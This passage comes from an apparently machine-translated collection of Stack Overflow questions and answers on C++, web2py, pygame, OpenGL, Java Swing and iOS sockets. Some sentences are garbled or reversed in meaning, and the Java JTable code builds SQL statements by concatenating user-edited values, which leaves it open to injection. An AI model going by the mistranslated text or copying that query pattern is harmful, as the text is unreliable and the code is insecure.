* * *

这就解释了为什么 the`is_assignable`和 assignment 语句以它们的方式工作，但它仍然不能帮助我解决我原来的问题：我如何检测给定类型是否可以接受`nullptr`或`NULL`？

不幸的是，我仍然受限于类型特征，因为它们只能检测是否存在有效接口。对于`nullptr`，似乎没有好的答案。有了`boost::function`，对于 来说确实存在一个有效的接口`nullptr`，但是函数体的实现对于这种类型是无效的，对于诸如`f = nullptr;`.

但是我可以在编译时 正确检测到`NULL`可以分配给给定类型，例如吗？要求我提供第二个参数的类型。我们已经知道这是行不通的，因为它的计算结果为. 我可以用作类型，但这非常罗嗦，需要我知道我正在使用的类型的内部细节。`boost::function``std::is_assignable``decltype(NULL)``int``boost::function<void()>::function::clear_type*`

一个优雅的解决方案涉及创建自定义类型特征，该特征来自 Luc Danton 在[SO 上的另一篇文章中](https://stackoverflow.com/a/9544792/1342711)。我不会描述这种方法的细节，因为它们在另一个问题中得到了更好的解释，但我的自定义类型特征的代码可以在这里看到：

```
template<typename> struct Void { typedef void type; };

template<typename T, typename Sfinae = void>
struct is_assignable_with_NULL: std::false_type {};

template<typename T>
struct is_assignable_with_NULL<T, 
    typename Void< decltype( std::declval<T>() = NULL ) >::type
>: std::true_type {}; 
```

我可以使用类似于 的这种新类型特征`std::is_assignable`，但我只需要在左侧提供对象的类型：

```
is_assignable_by_NULL<boost::function<void()>::value 
```

像所有类型特征一样，这仍然只会检查有效接口，忽略函数体的有效性，但它最终允许我`boost::function`在编译时正确确定是否可以将 NULL 分配给（和任何其他类型）。

# python - 我用 web2py 上传了一张图片，现在它打开下载而不是在浏览器中查看。为什么？

> ID：10220318
> 
> 赞同：0
> 
> 时间：2012-04-19T01:12:58.140
> 
> 标签：python, google-app-engine, database-design, http-headers, web2py

使用 web2py 和 Google App Engine，我创建了一个模型文件、一个用于上传图像的字段和另一个用于保存其下载 URL 的字段。

```
Field('logotipo_marca_url', 'upload', uploadfield='logotipo_marca_blob'),
Field('logotipo_marca_blob', 'blob'), 
```

我为了检索图像保存，我使用示例应用程序中的默认下载代码：

```
function download():
    return response.download(request,db) 
```

当我在 html IMG 标记中使用图像 URL 时，图像会显示在 HTML 中......但是如果我将图像粘贴到浏览器上，它将被下载而不是在浏览器中打开。

我尝试更改响应标头，例如“Content-type”和“Content-Disposition”，但我成功了。

Q1：我需要在浏览器中打开该图像。

Q2：还有一件事发生了，下载的图像与上传的原始文件名相同......我需要更改它和我将选择的名称。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T22:04:42.567

ftfy

```
function download():
    return response.download(request,db, attachment=False) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T12:09:15.377

图像必须具有`Content-Type=image/jpeg`（或其他相关类型：png、gif ..），以便浏览器将其视为图像。不要使用[`Content-Disposition`](http://en.wikipedia.org/wiki/MIME#Content-Disposition)，这是在用于将数据声明为可下载文件的浏览器中。

# c++ - 二维数组解除分配

> ID：10220322
> 
> 赞同：3
> 
> 时间：2012-04-19T01:13:33.513
> 
> 标签：c++, arrays, visual-studio-2010, pointers, multidimensional-array

作为介绍，我在 Visual Studio 2010 中使用 C++，为 x64 编译。我有一个程序使用二维数组来存储数据，以便通过我无法控制的 C 风格函数运行：

```
float **results;
results = new float*[rows];
for (int i = 0; i < rows; ++i){
    results[i] = new float[columns];
}

int **data;
data = new int*[rows];
for (int i = 0; i < rows; ++i){
    data[i] = new int[columns];
}

//send data to the function and populate results with values
ExternalFunction(*data, *results);

//delete everything
for (int i = 0; i < rows-1; ++i){
    delete [] &results[i];
    delete [] &data[i];
}
delete [] results;
delete [] data; 
```

这会导致 VS10 通过 _BLOCK_TYPE_IS_VALID(pHead -> nBlockUse) 的调试断言失败。这发生在程序结束时，无论在包含删除的最后几行中实际发生了什么。这到底是什么意思？我究竟做错了什么？我觉得它真的很简单，但是我一直在看这个代码太久了。

--EDIT--- 由于 dasblinkenlight 对我的大脑的帮助，问题得以解决！

```
float *results = new float[rows * columns];
float *data = new float[rows * columns];

ExternalFunction(&data[0], &results[0]);

delete [] results;
delete [] data; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:39:12.973

您的代码崩溃，因为您将地址的地址传递给`delete[]`，这不是您分配的。将您的代码更改为：

```
for (int i = 0; i < rows ; ++i){
    delete [] results[i];
    delete [] data[i];
} 
```

它不会再崩溃了。

这方面的规则很简单：由于您将结果分配给`new[..]`to `results[i]`，因此您应该传递`results[i]`，而不是`&results[i]`to `delete []`。也一样`data`。

另请注意，此代码会删除您分配的所有行，包括最后一行（循环条件是 now `i < n`， not `i < n-1`）。谢谢bjhend！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-19T10:01:57.867

您可以将以下用作宏或某些删除函数，用于预定义行数的二维数组：

```
for_each(results, results + rows , [](int* row) { delete[] row; });
delete[] results; 
```

# python - 我在 pygame 中的步行动画不起作用

> ID：10220323
> 
> 赞同：0
> 
> 时间：2012-04-19T01:13:35.873
> 
> 标签：python, pygame

我正在尝试使用 pygame 在 python 中获取我的步行动画，但我收到以下错误：

```
Traceback (most recent call last):
  File "C:\Users\name\Desktop\game\game.py", line 37, in <module>
    player1 = player()
  File "C:\Users\name\Desktop\game\game.py", line 21, in __init__
    self.img = pygame.image.load(self.ani[1])
IndexError: list index out of range 
```

这是我的代码：

```
from pygame.locals import *

pygame.init()
clock = pygame.time.Clock()

height = 400
width = 800
screen = pygame.display.set_mode((width, height), 0, 32)

class player:
    def __init__(self):
        self.x = 200
        self.y = 300
        self.ani_speed_init = 10
        self.ani_speed = self.ani_speed_init
        self.ani = glob.glob("game\redplayer*.png")
        self.ani.sort()
        self.ani_pos = 0
        self.ani_max = len(self.ani) - 1
        self.img = pygame.image.load(self.ani[1])
        self.update(0)

    def update(self, pos):
        if pos != 0:
            self.ani_speed -= 1
            self.x += pos
            if self.ani_speed == 0:
                self.img = pygame.image.load(self.ani[self.ani_pos])
                self.ani_speed = self.ani_speed_init
                if self.ani_pos == self.ani_max:
                    self.ani_pos = 0
                else:
                    self.ani_pos += 1
        screen.blit(self.img,(self.x, self.y))

player1 = player()
pos = 0 
```

我检查了文件名，我不认为是这样，但它可能是

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:14:07.467

看起来您在 self.ani 的索引上的表现不一。列表中的第一项是索引 0，因为您只加载了一个帧。

```
self.img = pygame.image.load(self.ani[0]) 
```

我在我的机器上弄乱了你的代码以使其正常工作，就是这样。:) 将每个动画帧预加载到预渲染表面列表中，然后将适当的帧传送到屏幕上。还添加了一个简单的游戏循环（按 Q 退出），包括一个 FPS 时钟。

```
import pygame
from pygame.locals import *

pygame.init()
clock = pygame.time.Clock()
FPS = 30

width = 800
height = 600

screen = pygame.display.set_mode((width, height), 0, 32)

class player:
    def __init__(self, init_pos = (10,10), init_ani_speed = 10):
        self.x = init_pos[0]
        self.y = init_pos[1]

        self.ani_speed_init = init_ani_speed
        self.ani_speed = self.ani_speed_init

        self.ani = []
        # nux-style code here! :)
        # self.ani.append(glob.glob("game\\redplayer_01*.png"))
        # self.ani.append(glob.glob("game\\redplayer_02*.png"))

        self.ani.append("./ani/super_neko_01.png")
        self.ani.append("./ani/super_neko_02.png")

        self.ani_max = len(self.ani)-1
        self.ani_pos = 0

        self.img = []
        for item in self.ani:
            self.img.append(pygame.image.load(item))

        self.update(0)

    def update(self, pos = 0):
        # init: starts at 10, immediately blits self to screen at x,y
        if pos != 0:
            self.ani_speed -= 1 
            self.x += pos # move right by pos pixels
            if self.ani_speed == 0:
                self.ani_speed = self.ani_speed_init
                if self.ani_pos < self.ani_max:
                    self.ani_pos += 1
                else:
                    self.ani_pos = 0

        tempSurf = self.img[self.ani_pos]
        screen.blit(tempSurf,(self.x, self.y))

player1 = player()

# Main Game Loop
quit = False
while quit == False:
    for event in pygame.event.get():
        if (event.type == KEYUP): 
                    if (event.key == K_q):
                        quit = True

    if quit == False:
        player1.update(1)
        pygame.display.update()
    clock.tick(FPS)

pygame.quit() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T01:37:40.240

"\r" 是一个回车，使你的文件名为 "game<carriage return>edplayer*.png"。

请尝试“game\\redplayer*.png”或 r“game\redplayer*.png”。

# android - 通过 google TTS API 使用阿拉伯字符

> ID：10220324
> 
> 赞同：0
> 
> 时间：2012-04-19T01:13:49.057
> 
> 标签：android, string, media-player, google-api, arabic

我正在使用谷歌 TTS API，我想用阿拉伯语进行查询，但不断出错，我已将文本文件编码设置为 UTF-8，这是我的代码

```
 String oLanguage = "ar";
    MediaPlayer player = new MediaPlayer();
    String mainText = "الله";
    try {           
        player.setAudioStreamType(AudioManager.STREAM_MUSIC);
        player.setDataSource("http://translate.google.com/translate_tts?tl=" + oLanguage + "&q=" + mainText);
        player.prepare();
        player.start();

    } catch (Exception e) {
        // TODO: handle exception
    } 
```

当我使用其他语言时，代码可以正常工作，但是当我使用阿拉伯语时，我得到了这个错误

```
04-19 01:04:10.221: E/MediaPlayer(665): error (1, -2147483648) 
```

另一件事是当我尝试将阿拉伯代码直接使用到链接中时，它会像这样显示

```
player.setDataSource("http://translate.google.com/translate_tts?tl=ar&q=%D8%A7%D9%84%D9%84%D9%87"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-23T09:34:25.013

经过长时间的尝试解决这个问题，我发现的唯一解决方案是在发出类似于浏览器的请求之前更改用户代理。

然而，根据我的研究，改变媒体播放器的用户代理非常复杂，所以我决定先下载文件然后播放。在每种情况下，仍然需要使用以下行更改用户代理

```
(HttpURLConnection Object).addRequestProperty("User-Agent", "Mozilla/5.0"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-20T07:07:31.690

关于编码url的原因，试试这个：

URI uri = new URI(""http://translate.google.com/translate_tts?tl=" + oLanguage + "&q=" + mainText");

player.setDataSource(uri.toASCIIString());

# c - 使用顶点缓冲区对象为 OpenGL 中的图元赋予颜色

> ID：10220327
> 
> 赞同：1
> 
> 时间：2012-04-19T01:13:51.157
> 
> 标签：c, opengl, shader

我正在用 C 语言编写一个程序，使用 OpenGL 来绘制一些图元（线、圆等）。我已经成功地使用缓冲区对象来存储图元的顶点，从而绘制它们。但我现在似乎被卡住了，因为我不知道如何设置它们的颜色。程序的一部分是老师给我的，所以我知道颜色属性必须使用这个结构来指定：

```
typedef struct {
    float r;
    float g;
    float b;
    float a;
} vec4; 
```

我知道我应该使用 vec4 数组来存储颜色值，所以我声明了一个这样的变量。第一个是 vec2 数组，用于存储原始顶点。

```
vec2 vertices[10000];
vec4 colours[10000]; 
```

（据我了解）用于设置顶点缓冲区限制的函数如下所示：

```
void initShaders(void) 
{
    GLuint buffer;
    GLuint loc;
    GLuint vao;

    /*Create and initialize a program object with shaders */ 
  idProgram = initProgram("ass1vshader.glsl", "ass1fshader.glsl");

    /*installs the program object as part of current rendering state */ 
   glUseProgram(idProgram);

   /*Creat a vertex array object */ 
   glGenVertexArrays(1, &vao);
   glBindVertexArray(vao);

    /*Create buffer in the shared display list space and */ 
     /* bind it as GL_ARRAY_BUFFER */ 
    glGenBuffers( 1, &buffer);
    glBindBuffer( GL_ARRAY_BUFFER, buffer);
    glBufferData( GL_ARRAY_BUFFER, sizeof(vertex)+sizeof(colours), NULL,GL_STATIC_DRAW);

    /*Initialize attribute vPosition in program */ 
    loc = glGetAttribLocation( idProgram, "vPosition");
    glEnableVertexAttribArray(loc);
    glVertexAttribPointer(loc, 2, GL_FLOAT, GL_FALSE, 0, (GLvoid*)BUFFER_OFFSET(0));

    /*Get location of the uniform attribute 'u_proj_matrix' */ 
    idProjection = glGetUniformLocation(idProgram, "u_proj_matrix");

    /*Set graphics attributes */ 
    glLineWidth(3.0);
    glPointSize(1.0);
    glClearColor(1.0, 1.0, 1.0, 1.0);

} 
```

如您所见，我已将顶点缓冲区大小初始化为“顶点”和“颜色”的组合大小。

我也了解到片段着色器在着色过程中起着重要作用。它看起来像这样：

```
#version 140

in vec4 color;
out vec4  fColor;

void
main()
{    
    fColor = color;
} 
```

有人可以告诉我如何为我的图元赋予颜色吗？我希望我提供的信息是足够的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T04:42:50.157

一种方法是使用颜色数组。[`glColorPointer()`](http://www.opengl.org/sdk/docs/man/xhtml/glColorPointer.xml)您可以通过调用`glVertexPointer()`.

另外，我不知道这是否只是一个错字，或者你是否真的有这个错误，但你写道：

```
glBufferData( GL_ARRAY_BUFFER, sizeof(vertex)+sizeof(colours), NULL,GL_STATIC_DRAW); 
```

但是，您的顶点数组被命名为“顶点”而不是“顶点”（至少根据您之前的陈述）。如果它编译正常，那么它可能意味着你有另一个名为 vertex 的变量或数据结构，但它并没有按照你的想法做。

而且由于您的数据没有交错（您有单独的顶点和颜色数据），我认为您需要为它们使用单​​独的缓冲区。如果它们在一个结构中，您可以使用单个数组，并适当地设置步幅，但由于它们没有交错，我不确定您尝试做的事情是否有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T08:37:24.470

首先，您没有向您展示顶点着色器，它负责接收每个顶点颜色并将其输出以在图元上进行插值并发送到片段着色器。我猜它看起来（或应该看起来）类似于：

```
uniform mat4 u_proj_matrix;

in vec4 vPosition;
in vec4 vColor;

out color;

void main()
{
    gl_Position = u_proj_matrix * vPosition;
    color = vColor;
} 
```

所以我们有一个额外的每个顶点属性调用`vColor`，我们需要指定一个源，就像我们为`vPosition`属性所做的那样：

```
loc = glGetAttribLocation(idProgram, "vColor");
glEnableVertexAttribArray(loc);
glVertexAttribPointer(loc, 4, GL_FLOAT, GL_FALSE, 0, 
                      (GLvoid*)BUFFER_OFFSET(sizeof(vertices))); 
```

这指定了在所有 10000 个顶点的坐标之后要存储在缓冲区中的所有 10000 个顶点的颜色。

* * *

但正如 user1118321 已经指出的那样，将单个顶点的坐标和颜色存储在一起并因此交错属性可能是一个更好的主意（即使不是唯一可能的）。在这种情况下，您将拥有这样的结构：

```
typedef struct {
    vec2 coords;
    vec4 color;
} vertex; 
```

以及其中的一个数组：

```
vertex vertices[10000]; 
```

但是在这种情况下，我们必须通过使用 stride 和 offset 参数来告诉 OpenGL 我们的数据是交错的`glVertexAttribPointer`：

```
//for position:
glVertexAttribPointer(loc, 2, GL_FLOAT, GL_FALSE, 
                      sizeof(vertex), (GLvoid*)offsetof(vertex, coords));

//for color:
glVertexAttribPointer(loc, 4, GL_FLOAT, GL_FALSE, 
                      sizeof(vertex), (GLvoid*)offsetof(vertex, color)); 
```

这告诉 OpenGL，两个连续顶点的属性值之间的步幅（从一个到下一个的偏移量）是我们自定义结构的大小。意思是从一个顶点的坐标数据的开始到下一个顶点的坐标数据，我们必须“跳过”`sizeof(vertex)`字节（最有可能`sizeof(vec2)+sizeof(vec4) = 24`），对于颜色也是如此。

此外，我们告诉 GL，我们的顶点数据从第一个顶点的 coords 成员的偏移量开始（很可能是`0`），而我们的颜色数据从第一个顶点的颜色成员的偏移量开始（很可能是`sizeof(vec2) = 8`）。

# java - 尝试在随机字母中混合字符串字符

> ID：10220328
> 
> 赞同：1
> 
> 时间：2012-04-19T01:13:54.623
> 
> 标签：java, arrays, string

我试着把一个词拆开，然后把它混在 12 个随机字母中。

有谁知道为什么这段代码只能工作 5 次中的 3 次？当它不起作用时，它只缺少应该存在的 1 或 2 个字母。

谢谢

```
public static String MixWordWithLetters(String word) {
Random r = new Random();

String characters = "abcdefghijklmnopqrstuvwxyz";  
char[] text = new char[12];
for (int i = 0; i < 12; i++)
{
    text[i] = characters.charAt(r.nextInt(characters.length()));
}
String randomletters = new String(text);

char[] wrd = word.toCharArray();
char[] rl = randomletters.toCharArray();

for (int i = 0; i < wrd.length; i++) {
    int rand = (int) (Math.random() * rl.length);
    rl[rand] = wrd[i] ;
}

 String WordMixed = new String(rl);
return WordMixed; } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:25:44.630

在这个循环中，

```
for (int i = 0; i < 12; i++) 
{
    text[i] = characters.charAt(r.nextInt(characters.length()));
} 
```

`r.nextInt(characters.length())`考虑在两次不同的迭代中返回相同的数字时会发生什么。

`Math.random() * rl.length`在另一个循环中类似。

## 数组混洗器需要跟踪哪些元素已经过混洗

假设我们从以下开始：

```
a b c d e f 
```

考虑洗牌数组的第一个元素。它需要从集合`{a, b, c, d, e, f}`中以每个元素的 1/6 概率随机选取。

洗牌数组的第二个元素需要从`{a, b, c, d, e, f} - {shuffled[0]}`原始数组的所有元素中随机挑选，减去第一个位置挑选的元素，这次是 1/5 的概率。

同样，第三个元素来自`{a, b, c, d, e, f} - {shuffled[0], shuffled[1]}`，每个都有 1/4 的概率，依此类推。

*如果您正在就地*改组数组，那么您可以通过交换来移动元素，这最终会自动跟踪剩余的元素。说`e`是第一选择。看看如果我们交换`a`和会发生什么`e`：

```
e b c d a f
^ . . . . . 
```

由于选择的元素被移动到索引 0，所有剩余的元素现在都在索引 1 到 5 中。现在只需要从索引 1 到 5 之间选择下一个元素。

假设`b`下一个被选中，因此它与自身交换：

```
e b c d a f
^ ^ . . . . 
```

不，我们在索引 2 到 5 处有剩余元素。算法可以以这种方式继续运行，直到索引 4，此时整个数组将被打乱。因为元素交换让您可以轻松地跟踪剩余的内容，**所以更容易就地打乱数组**。

如果您查看 JDK 源代码，您会发现它[`Collections.shuffle()`做了同样的事情，只是进行了一次优化](http://www.docjar.com/html/api/java/util/Collections.java.html#471)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T01:31:43.460

我不确定你的问题是什么，但我会冒险猜测。char 数组 text[] 的长度为 12。假设传入的单词小于那个？

当您遍历 wrd 并将字符放入 rl 时，不能保证您不会覆盖您之前放入的字母。

# ios - 设置 NSStreamNetworkServiceTypeBackground “在幕后做什么”？

> ID：10220329
> 
> 赞同：3
> 
> 时间：2012-04-19T01:14:13.033
> 
> 标签：ios, c, sockets, ios5

我有一个内部应用程序（不适用于 iPhone 商店分发，因此不受 Apple 批准），它需要在运行时绑定少量 TCP 和 UDP 套接字。

在测试时，我注意到绑定套接字有一些奇怪的行为——只要设备进入睡眠状态，它就会关闭。例如，当您按下手机顶部的电源按钮时，就会发生这种情况，我**真的**不希望它这样做。更不用说这似乎严重违反了 BSD 套接字 API 合同。

套接字代码全部用 C 编写，因此不使用 Objective-C [nsstream](http://developer.apple.com/library/ios/#documentation/Cocoa/Reference/Foundation/Classes/NSStream_Class/Reference/Reference.html)库。

我注意到有多种方法可以让 VOIP、音乐流和其他事物的套接字保持打开状态。nsstream 文档本身列出了一个`NSStreamNetworkServiceTypeBackground`属性，它似乎可以帮助我的应用程序在手机进入睡眠状态时保持其套接字打开。苹果文档的底部列出了以下属性：

> **常数**
> 
> `NSStreamNetworkServiceTypeVoIP`
> `指定流正在提供 VoIP 服务。`
> 
> ``NSStreamNetworkServiceTypeVideo`
> `指定流正在提供视频服务。``
> 
> ```NSStreamNetworkServiceTypeBackground`
> `指定流正在提供后台服务。```
> 
> ````NSStreamNetworkServiceTypeVoice`
> `指定流提供语音服务。````

 ```但是由于我的应用程序的网络代码没有使用 Objective-C API，我需要知道：上述常量是如何实现的？也许有一个未记录的套接字选项可以用来实现相同的结果？基本上我只需要告诉内核在设备休眠时不要弄乱我的套接字。

**编辑**：作为反向工程内核调用的替代方案，也许有一种方法可以将我的套接字文件描述符传递给可以应用这些选项的 Objective-C 代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-27T14:03:39.657

如果您使用 CFStream 进行联网，您可以这样做：

```
NSInputStream *inputStream = (__bridge_transfer NSInputStream *)readStream;
NSOutputStream *outputStream = (__bridge_transfer NSOutputStream *)writeStream; 
```

之后，您可以使用已在 ObjC`NSInputStream`和`NSOutputStream`. （`NSInputStream`并且`NSOutputStream`两者都扩展`NSStream`。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-10T01:48:21.377

clientSocket c 套接字并且必须已经连接，然后使用对象 c：

```
@property (nonatomic, strong) NSInputStream *inputStream ;
@property (nonatomic, strong) NSOutputStream *outputStream ;

CFReadStreamRef readStreamRef = nil ;
CFWriteStreamRef writeStreamRef = nil ;
CFStreamCreatePairWithSocket(NULL, clientSocket, &readStreamRef, &writeStreamRef) ; // the socket must have already been connected.
_inputStream = (__bridge_transfer NSInputStream *)readStreamRef ;
_outputStream = (__bridge_transfer NSOutputStream *)writeStreamRef ;
[_inputStream setProperty:NSStreamNetworkServiceTypeVoIP forKey:NSStreamNetworkServiceType] ;
[_outputStream setProperty:NSStreamNetworkServiceTypeVoIP forKey:NSStreamNetworkServiceType] ;
[_inputStream open] ;
[_outputStream open] 
``````

# pdo - 一次更新的 pdo 事务

> ID：10220333
> 
> 赞同：1
> 
> 时间：2012-04-19T01:14:54.010
> 
> 标签：pdo

将使用 pdos

```
$dbc -> beginTransaction();
$q = $dbc -> prepare("UPDATE ............... ");
$dbc -> commit(); 
```

进行一次更新时提高性能？

还是仅在执行多个查询时？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T08:56:22.120

不，仅对单个查询使用事务是没有意义的。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-04-05T08:18:48.777

从文档中：

> 调用 PDO::prepare() 和 PDOStatement::execute() 为将使用不同参数值多次发出的语句通过允许驱动程序协商查询计划的客户端和/或服务器端缓存来优化应用程序的性能和元信息...

对我来说，这意味着 PDO::prepare() 专门优化了多个查询的性能。是否“针对多个查询进行优化”==“一个查询的开销”可能取决于您通过实现和测试来确定。

# java - JTable 动态更新

> ID：10220337
> 
> 赞同：0
> 
> 时间：2012-04-19T01:15:29.880
> 
> 标签：java, swing, jtable, jframe

我有一个正在处理的项目，它允许我创建模板和输入数据。不工作的一件事是表没有动态更新。它只会在我关闭应用程序并再次运行后刷新。是否有与 UpdateUI 类似的方法，它可以在您面前更新，而无需退出应用程序并再次重新打开以查看更改？我有下面的代码，有人能指出什么代码以及我会把它放在课堂上的什么地方吗？谢谢你。

```
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Insets;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Collections;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.SwingConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.border.LineBorder;
import javax.swing.event.CellEditorListener;
import javax.swing.event.ChangeEvent;

public class ViewTable extends JFrame {

    private static final long serialVersionUID = 1L;
    private static final String PREFERRED_LOOK_AND_FEEL = null;
    private static String tableName;
    private String[] columnNames;
    private String[][] data;
    private JPanel mainPanel;
    private JTable tablePane;
    private int dataX;
    private int dataY;

    public ViewTable(String tableName){
        this.tableName=tableName;

        initComponents();
        loadDB();
        displayTable();

        /*setDefaultCloseOperation(CreateTemplate.DISPOSE_ON_CLOSE);
        setSize(700,700);
        setTitle("View Table");
        setVisible(true);*/
        Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
        this.setSize(dim.width, dim.height);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setVisible(true);

    }

    private void initComponents() {
        mainPanel = new JPanel(new BorderLayout());
        this.add(mainPanel);
        mainPanel.setBackground(Color.gray);

        JPanel topPanel = new JPanel(new BorderLayout());
        topPanel.setBackground(Color.DARK_GRAY);
        mainPanel.add(topPanel,BorderLayout.NORTH);

        JLabel titleLabel = new JLabel(this.tableName);
        titleLabel.setBorder(new LineBorder(Color.black));
        titleLabel.setFont(new Font("Helvetica", Font.BOLD, 24));
        titleLabel.setForeground(Color.white);
        titleLabel.setHorizontalAlignment(SwingConstants.CENTER);
        topPanel.add(titleLabel,BorderLayout.CENTER);

        JPanel buttonPanel = new JPanel(new BorderLayout());
        JButton exitButton = new JButton("Finish");
        exitButton.addActionListener(new ActionListener(){
            public void actionPerformed(ActionEvent event){
                close_window();
            }
        });
        exitButton.setBorder(new EmptyBorder(new Insets(20,20,20,20)));
        buttonPanel.add(exitButton,BorderLayout.EAST);

        JButton deleteButton = new JButton("Delete Entry");
        deleteButton.addActionListener(new ActionListener(){
            public void actionPerformed(ActionEvent event){
                Object[] rows = new Object[dataX-1];
                for (int r=0;r!=rows.length;r++){
                    rows[r] = data[r][0];
                }
                //JOptionPane delAsk = new JOptionPane("Delete entry:",JOptionPane.PLAIN_MESSAGE,JOptionPane.DEFAULT_OPTION,null,rows,rows[0]);
                //delAsk.
                //delAsk.set.InputDialogue(null,"Delete entry:","Delete",JOptionPane.PLAIN_MESSAGE,null,rows,rows[0]);
                //JDialog dialog = delAsk.createDialog(null, "Delete");
                //dialog.show();
                //String del = (String)delAsk.getInputValue();
                //System.out.println(del);

                Object deleteRow 
                = JOptionPane.showInputDialog(null,"Which entry do you wish to delete",
                        "Delete Entry",JOptionPane.INFORMATION_MESSAGE,null,
                        rows,rows[0]);      
                int index = -1;
                for(int i=0;i!=rows.length;i++){
                    if(rows[i].equals(deleteRow.toString())){ index = i; }
                }

                SQLCommands.SQLCommand("DELETE FROM "+tableName+" WHERE recID='"+index+"'");
                initComponents();
                loadDB();
                displayTable();
                tablePane.updateUI();
            }
        });
        deleteButton.setBorder(new EmptyBorder(new Insets(20,20,20,20)));
        buttonPanel.add(deleteButton,BorderLayout.WEST);

        topPanel.add(buttonPanel,BorderLayout.EAST);

    }

    private void close_window(){ this.dispose(); }

    private void loadDB(){
        //get column names
        columnNames = getColumnNames();

        for (String S : columnNames){ System.out.println(S); }//JOptionPane.showInputDialog("Enter template name"); }

        //Temp add new dummy data
        //SQLCommands.SQLCommand("INSERT INTO "+tableName+" VALUES (1,'av', 'bv', 'cv', 'dv', 'ev')");

        //use column names to populate data

        String[] col = SQLCommands.returnSQLCommand("SELECT "+columnNames[0]+" FROM "+tableName+"");

        dataX = col.length+1;
        dataY = columnNames.length;
        System.out.println(dataX+" "+dataY);

        data = new String[dataX][dataY];
        printTable(data);
        System.out.println();

        //e.g. data[4][0] => "SELECT Name FROM tableName"[4]

        for(int j=0;j!=columnNames.length;j++){
            String n = columnNames[j];

            col = SQLCommands.returnSQLCommand("SELECT "+n+" FROM "+tableName+"");

            for(int i=0; i!=col.length; i++){
                data[i][j]=col[i];
            }
        }
        for(int j=0;j!=dataY;j++){
            data[dataX-1][j]="";
        }

        for(String D1[] : data){
            for(String D : D1){
                System.out.print(D+" ");
            }
            System.out.printf("\n");
        }

        /*columnNames = new String[2];
        columnNames[0] = "col 1";
        columnNames[1] = "col 2";
        data = new String[2][2];
        data[0][0] = "hello";
        data[0][1] = "good bye";
        dataX = 2;
        dataY = 2;*/
    }

    private void displayTable(){
        //use JTable
        tablePane = new JTable(data,columnNames);
        tablePane.setFillsViewportHeight(true);
        tablePane.setShowHorizontalLines(true);

        tablePane.setCellSelectionEnabled(true);
        tablePane.setRowSelectionAllowed(true);

        tablePane.getDefaultEditor(String.class).addCellEditorListener(new MyCellEditorListener(tablePane));

        //new JScrollPane which uses the table
        JScrollPane scrollPane = new JScrollPane(tablePane,JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED,JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        scrollPane.setBorder(new EmptyBorder(new Insets(15,15,15,15)));

        //put JScrollpane in CENTER box
        mainPanel.add(scrollPane,BorderLayout.CENTER);

    }

    public static String[] getColumnNames(){
        Connection connection=null;
        Statement statement=null;
        ResultSet result = null;
        String[] names=null;

        try {
            Class.forName("org.sqlite.JDBC");
            connection = DriverManager
                    .getConnection("jdbc:sqlite:Media.db");
            statement = connection.createStatement();
            result = statement.executeQuery("PRAGMA table_info( "+tableName+" );");
            ArrayList<String> nameList = new ArrayList<String>();
            while(result.next()){
                nameList.add(result.getString(2));
            }
            names = new String[nameList.toArray().length-1];
            for (int i=1; i!=nameList.toArray().length; i++){
                names[i-1] = (String)nameList.toArray()[i];
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                statement.close();
                connection.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return names;
    }

    private class MyCellEditorListener implements CellEditorListener
    {

        private JTable table;
        private String[][] datain;

        public MyCellEditorListener(JTable table){
            this.table = table;

            setupDataIn();

        }

        private void setupDataIn(){
            datain = new String[dataX][dataY];
            for(int i=0; i!=dataX; i++){
                for(int j=0; j!=dataY; j++){
                    datain[i][j]=data[i][j];
                }
            }
        }

        @Override
        public void editingCanceled(ChangeEvent arg0) {
            //Do Nothing
        }

        @Override
        public void editingStopped(ChangeEvent e) {
            // Update DB
            printTable(data);
            printTable(datain);

            for(int i=0; i!=dataX; i++){
                for(int j=0; j!=dataY; j++){
                    if(datain[i][j].equals(data[i][j])){
                        //DO Nothing
                    } else {
                        //Update or add new field
                        if(i==dataX-1){
                            System.out.println("new field");
                            String com = "INSERT INTO "+tableName+" VALUES ("+(dataX-1)+", ";
                            for(int y=0;y!=dataY;y++){
                                if(y==j){
                                    com += "'"+data[i][j]+"', ";
                                } else {
                                    com += "'', ";
                                }
                            }
                            com = com.substring(0, com.length()-2);
                            com+=")";

                            System.out.println(com);
                            SQLCommands.SQLCommand(com);
                            initComponents();
                            loadDB();
                            setupDataIn();
                            displayTable();
                            tablePane.updateUI();
                            break;

                        } else {
                            System.out.println("UPDATE "+tableName+" SET "+columnNames[j]+"='"+data[i][j]+"' WHERE recID="+i);
